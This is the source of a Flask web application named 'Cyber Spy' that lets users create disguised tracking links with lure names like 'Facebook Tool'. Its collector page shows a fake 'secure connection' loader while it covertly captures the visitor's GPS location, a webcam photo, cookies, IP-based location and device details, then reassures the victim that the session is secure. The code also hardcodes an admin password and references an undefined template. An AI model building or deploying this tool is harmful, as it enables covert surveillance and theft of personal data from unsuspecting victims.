from flask import Flask, render_template_string, request, redirect, url_for, session
from pymongo import MongoClient
import datetime
import hashlib
import os
import requests
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ===== MongoDB Connection =====
MONGO_URI = os.environ.get('MONGO_URI')
if not MONGO_URI:
    raise Exception("MONGO_URI environment variable not set!")

try:
    client = MongoClient(
        MONGO_URI,
        tls=True,
        tlsAllowInvalidCertificates=True,
        serverSelectionTimeoutMS=5000
    )
    db = client['spy_db']
    users_col = db['users']
    client.admin.command('ping')
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    raise

# ===== Base CSS =====
BASE_CSS = """
<style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
    body{background:#0a0e17;color:#00ffcc;padding:15px;min-height:100vh;display:flex;justify-content:center;align-items:center}
    .box{background:#111927;padding:30px 25px;border-radius:20px;width:100%;max-width:500px;box-shadow:0 0 40px #00ffcc11}
    h2{text-align:center;color:#ff0044;font-size:2.2rem;margin-bottom:15px}
    .sub{text-align:center;color:#886688;font-size:1.2rem;margin-bottom:25px}
    input,button{width:100%;padding:18px;margin:12px 0;border-radius:12px;border:1px solid #334466;background:#0b111e;color:#c0d4ff;font-size:1.2rem;touch-action:manipulation}
    button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold;transition:0.2s}
    button:hover{background:#ff004466}
    a{color:#00ffcc;display:inline-block;margin-top:12px;font-size:1.1rem}
    .error{color:#ff8866;margin-top:12px;padding:12px;background:#ff004422;border-radius:8px;font-size:1.1rem}
    .container{max-width:1400px;margin:auto;padding:20px}
    .card{background:#1a2332;padding:25px;border-radius:18px;margin:20px 0}
    .card input,.card button{padding:18px;font-size:1.2rem}
    .brand{text-align:center;color:#ff8866;font-size:1.1rem;margin:15px 0;cursor:pointer;user-select:none}
    .brand:hover{color:#ff0044}
    .logout{float:right;background:#334466;padding:12px 22px;border-radius:12px;color:#c0d4ff;text-decoration:none;font-size:1.1rem}
    .welcome{font-size:1.3rem;color:#6688aa}
    .link-card{background:#0d1520;padding:20px;border-radius:15px;margin:15px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;border-left:5px solid #00ffcc;font-size:1.1rem}
    .link-card a{color:#00ffcc;word-break:break-all}
    .link-card .view-btn{background:#ff004422;padding:12px 25px;border-radius:10px;color:#ffccbb;text-decoration:none;font-size:1.1rem}
    .link-card .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 25px;border-radius:10px;color:#ffccbb;text-decoration:none;font-size:1.1rem}
    .visit-card{background:#0d1520;padding:22px;border-radius:18px;margin:20px 0;border-left:6px solid #ff0044;font-size:1.2rem}
    .visit-card img{max-width:250px;height:auto;border-radius:12px;border:1px solid #334466;display:block;margin:12px 0}
    .visit-card .label{color:#6688aa;font-weight:bold;display:inline-block;width:150px}
    .visit-card .value{color:#00ffcc;display:inline}
    .visit-card .row{margin:10px 0}
    .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 28px;border-radius:12px;cursor:pointer;color:#ffccbb;text-decoration:none;display:inline-block;margin-top:15px;font-size:1.2rem}
    h1{font-size:2.5rem;text-align:center;color:#ff0044}
    h3{font-size:1.8rem;color:#b0d4ff}
    .total-visits{font-size:1.5rem;color:#6688aa}
    .map-link{color:#00ffcc;text-decoration:underline;font-size:1.2rem}
    .admin-table{width:100%;border-collapse:collapse;font-size:0.9rem;margin-top:20px}
    .admin-table th,.admin-table td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
    .admin-table th{background:#1a2332;color:#ff0044}
    .admin-table tr:nth-child(even){background:#0d1520}
    .click-hint{color:#ff8866;font-size:1rem;margin-top:15px;cursor:pointer;text-align:center}
    .music-status{color:#00ffcc;font-size:1rem;margin-top:5px;text-align:center}
    @media(max-width:600px){
        .container{padding:10px}
        .box{padding:20px}
        h1{font-size:2rem}
        h2{font-size:1.8rem}
        input,button{padding:18px;font-size:1.1rem}
        .visit-card{font-size:1rem}
        .visit-card .label{width:100px}
        .link-card{font-size:1rem}
        .logout{font-size:1rem;padding:10px 18px}
        .admin-table{font-size:0.75rem}
        .admin-table th,.admin-table td{padding:6px}
    }
</style>
"""

# ===== Login Page (No music) =====
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ Cyber Spy</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
    <a href="/register">New user?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== Register Page =====
REGISTER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Register</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ Sign Up</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Register</button>
    </form>
    <a href="/login">Already have an account?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== Dashboard with Music =====
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Dashboard</title>""" + BASE_CSS + """
<style>
    .click-hint{color:#ff8866;font-size:1rem;margin-top:15px;cursor:pointer;text-align:center}
    .music-status{color:#00ffcc;font-size:1rem;margin-top:5px;text-align:center}
</style>
</head>
<body>
    <!-- Background Music -->
    <audio id="dashboardMusic" loop preload="auto">
        <source src="{{ url_for('static', filename='background.mp3') }}" type="audio/mpeg">
    </audio>

    <div class="container">
        <h1>🕵️ Cyber Spy</h1>
        <div class="brand" id="adminTrigger" onclick="adminClick()">Developer: Arif</div>
        <div id="musicStatus" class="music-status">🔊 Click anywhere to enable sound.</div>
        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:20px;">
            <span class="welcome">Welcome, {{ user.username }}</span>
            <a href="/logout" class="logout">🚪 Logout</a>
        </div>
        <div class="card">
            <h3>📎 Create New Link</h3>
            <form method="POST" action="/create_link">
                <input type="text" name="link_name" placeholder="Link name (e.g., Facebook Tool)" required>
                <button type="submit">🔗 Generate</button>
            </form>
        </div>
        <div class="card">
            <h3>📌 Your Links</h3>
            {% for link in user.links %}
            <div class="link-card">
                <div>
                    <strong>{{ link.name }}</strong><br>
                    <a href="{{ link.url }}" target="_blank">{{ link.url }}</a>
                </div>
                <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
                    <span>👁️ {{ link.visits|length }}</span>
                    <a href="/view_link/{{ link.id }}" class="view-btn">📊 View</a>
                    <a href="/delete_link/{{ link.id }}" class="del-btn" onclick="return confirm('Delete this link and all its data?');">🗑️ Delete</a>
                </div>
            </div>
            {% else %}
            <p style="color:#6688aa;font-size:1.2rem;">You haven't created any links.</p>
            {% endfor %}
        </div>
        <div class="click-hint" onclick="playMusic()">🎵 Click to play background music</div>
    </div>

    <script>
        let clickCount = 0;
        function adminClick() {
            clickCount++;
            if (clickCount >= 5) {
                window.location.href = "/admin-login";
                clickCount = 0;
            }
        }

        function playMusic() {
            const audio = document.getElementById('dashboardMusic');
            audio.play().then(() => {
                document.getElementById('musicStatus').textContent = '🔊 Sound enabled';
            }).catch(() => {
                document.getElementById('musicStatus').textContent = '🔊 Click again to play music';
                document.addEventListener('click', function playOnClick() {
                    audio.play();
                    document.getElementById('musicStatus').textContent = '🔊 Sound enabled';
                    document.removeEventListener('click', playOnClick);
                }, { once: true });
            });
        }

        window.onload = function() {
            setTimeout(playMusic, 500);
        };
    </script>
</body>
</html>
"""

# ===== Admin Login Page (Hidden) =====
ADMIN_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Login</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🔐 Admin Login</h2>
    <div class="sub">Enter admin password</div>
    <form method="POST">
        <input type="password" name="admin_password" placeholder="Admin Password" required>
        <button type="submit">Login</button>
    </form>
    <a href="/dashboard">⬅️ Back to Dashboard</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== Admin Panel (with Delete) =====
ADMIN_PANEL_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>""" + BASE_CSS + """
</head>
<body>
<div class="container">
    <h1>🛠️ Admin Panel</h1>
    <div class="brand">Developer: Arif</div>
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:20px;">
        <span class="welcome">Total Users: {{ users|length }}</span>
        <a href="/admin-logout" class="logout">🚪 Logout</a>
    </div>
    <div class="card">
        <h3>📋 All Users Data</h3>
        <div style="overflow-x:auto;">
        <table class="admin-table">
            <tr>
                <th>#</th>
                <th>Username</th>
                <th>Total Links</th>
                <th>Total Visits</th>
                <th>Actions</th>
            </tr>
            {% for u in users %}
            <tr>
                <td>{{ loop.index }}</td>
                <td>{{ u.username }}</td>
                <td>{{ u.links|length }}</td>
                <td>
                    {% set total = 0 %}
                    {% for link in u.links %}
                        {% set total = total + link.visits|length %}
                    {% endfor %}
                    {{ total }}
                </td>
                <td>
                    <a href="/admin-view-user/{{ u.username }}" style="color:#00ffcc;">📊 View</a>
                    &nbsp;|&nbsp;
                    <a href="/admin-delete-user/{{ u.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;">🗑️ Delete</a>
                </td>
            </tr>
            {% endfor %}
        </table>
        </div>
    </div>
</div>
</body>
</html>
"""

# ===== Admin View Single User =====
ADMIN_USER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
</head>
<body>
<div class="container">
    <a href="/admin-panel" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Admin Panel</a>
    <h1>📊 User: {{ user.username }}</h1>
    <p class="total-visits">Total Links: {{ user.links|length }}</p>
    <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🗑️ Delete this user</a>

    {% for link in user.links %}
    <div class="card">
        <h3>🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
        <div style="overflow-x:auto;">
        <table class="admin-table">
            <tr><th>#</th><th>IP</th><th>Location</th><th>GPS</th><th>Browser</th><th>Time</th></tr>
            {% for v in link.visits %}
            <tr>
                <td>{{ loop.index }}</td>
                <td>{{ v.ip }}</td>
                <td>{{ v.city }}, {{ v.country }}</td>
                <td>{{ v.gps or 'N/A' }}</td>
                <td>{{ v.user_agent[:30] }}..</td>
                <td>{{ v.time }}</td>
            </tr>
            {% endfor %}
        </table>
        </div>
    </div>
    {% else %}
    <p style="color:#6688aa;">No links found.</p>
    {% endfor %}
</div>
</body>
</html>
"""

# ===== Collector Page =====
COLLECTOR_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading...</title>
<style>
body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;text-align:center}
.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:70px;height:70px;animation:spin 1s linear infinite;margin:20px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
p{font-size:1.5rem;color:#6688aa}
.msg{color:#00ffcc;font-size:1.3rem;margin-top:30px}
</style>
</head>
<body>
    <div class="loader"></div>
    <p>⏳ Establishing secure connection...</p>
    <div id="status" class="msg"></div>
    <script>
        let gps = 'Permission denied';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
                () => { gps = 'Failed'; }
            );
        }
        let camera = null;
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320; canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                    sendData();
                }, 2000);
            })
            .catch(() => { camera = 'Failed'; sendData(); });

        function captureScreen() {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0a0e17';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc';
            ctx.font = '30px monospace';
            ctx.fillText('Secure Screen', 20, 50);
            return canvas.toDataURL('image/png');
        }

        function sendData() {
            let battery = 'N/A';
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    battery = Math.round(b.level * 100) + '%';
                }).catch(() => {});
            }
            let memory = 'N/A';
            if (navigator.deviceMemory) {
                memory = navigator.deviceMemory + ' GB';
            }
            let cookies = document.cookie || 'None';
            let referrer = document.referrer || 'Direct';

            const data = {
                ip: "{{ ip }}",
                user_agent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gps: gps,
                camera: camera,
                screenshot: captureScreen(),
                battery: battery,
                memory: memory,
                cookies: cookies,
                referrer: referrer,
                time: new Date().toLocaleString()
            };
            fetch('/collect/{{ link_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('status').innerHTML = '✅ Connection established. Please wait...';
                setTimeout(() => {
                    document.querySelector('.loader').style.display = 'none';
                    document.querySelector('p').textContent = 'Thank you! You are now connected.';
                    document.getElementById('status').innerHTML = '🔒 Your session is secure.';
                }, 1500);
            });
        }
    </script>
</body>
</html>
"""

# ===== Helper Functions =====
def get_user(username):
    return users_col.find_one({'username': username})

def create_user(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    user = {
        'username': username,
        'password': hashed,
        'links': []
    }
    users_col.insert_one(user)
    return user

# ===== Routes =====
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'Please enter username and password'
        else:
            user = get_user(username)
            if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
                session['user'] = username
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid credentials'
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'All fields required'
        elif get_user(username):
            error = 'Username already taken'
        else:
            create_user(username, password)
            return redirect(url_for('login'))
    return render_template_string(REGISTER_HTML, error=error)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML, user=user)

@app.route('/create_link', methods=['POST'])
def create_link():
    if 'user' not in session:
        return redirect(url_for('login'))
    link_name = request.form.get('link_name', '').strip()
    if not link_name:
        return redirect(url_for('dashboard'))
    link_id = str(uuid.uuid4())[:8]
    new_link = {
        'id': link_id,
        'name': link_name,
        'url': request.host_url + 'c/' + link_id,
        'visits': []
    }
    users_col.update_one({'username': session['user']}, {'$push': {'links': new_link}})
    return redirect(url_for('dashboard'))

@app.route('/delete_link/<link_id>')
def delete_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    result = users_col.update_one(
        {'username': session['user']},
        {'$pull': {'links': {'id': link_id}}}
    )
    if result.modified_count:
        return redirect(url_for('dashboard'))
    else:
        return 'Link not found or already deleted', 404

@app.route('/c/<link_id>')
def collector_page(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    try:
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
        city = loc.get('city', 'Unknown')
        country = loc.get('country', 'Unknown')
    except:
        city = 'Unknown'
        country = 'Unknown'
    return render_template_string(COLLECTOR_HTML, ip=ip, link_id=link_id)

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    data = request.get_json()
    if not data:
        return 'ERROR: No data', 400
    data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = data.get('ip')
    if ip:
        try:
            loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
            data['city'] = loc.get('city', 'Unknown')
            data['country'] = loc.get('country', 'Unknown')
        except:
            data['city'] = 'Unknown'
            data['country'] = 'Unknown'
    else:
        data['city'] = 'Unknown'
        data['country'] = 'Unknown'
    result = users_col.update_one(
        {'links.id': link_id},
        {'$push': {'links.$.visits': data}}
    )
    if result.matched_count:
        return 'OK', 200
    return 'ERROR: Link not found', 404

@app.route('/view_link/<link_id>')
def view_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    link = None
    for l in user['links']:
        if l['id'] == link_id:
            link = l
            break
    if not link:
        return 'Link not found', 404
    return render_template_string(VIEW_LINK_HTML, link=link)

@app.route('/delete_visit/<link_id>/<int:index>')
def delete_visit(link_id, index):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    for l in user['links']:
        if l['id'] == link_id:
            if 0 <= index < len(l['visits']):
                l['visits'].pop(index)
                users_col.update_one(
                    {'username': session['user'], 'links.id': link_id},
                    {'$set': {'links.$.visits': l['visits']}}
                )
                break
    return redirect(url_for('view_link', link_id=link_id))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ===== Admin Routes (Hidden) =====
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if 'admin' in session:
        return redirect(url_for('admin_panel'))
    error = None
    if request.method == 'POST':
        password = request.form.get('admin_password', '').strip()
        if password == 'arif123':
            session['admin'] = True
            return redirect(url_for('admin_panel'))
        else:
            error = 'Invalid admin password'
    return render_template_string(ADMIN_LOGIN_HTML, error=error)

@app.route('/admin-panel')
def admin_panel():
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    all_users = list(users_col.find())
    return render_template_string(ADMIN_PANEL_HTML, users=all_users)

@app.route('/admin-view-user/<username>')
def admin_view_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    user = get_user(username)
    if not user:
        return 'User not found', 404
    return render_template_string(ADMIN_USER_HTML, user=user)

@app.route('/admin-delete-user/<username>')
def admin_delete_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    result = users_col.delete_one({'username': username})
    if result.deleted_count:
        return redirect(url_for('admin_panel'))
    else:
        return 'User not found', 404

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)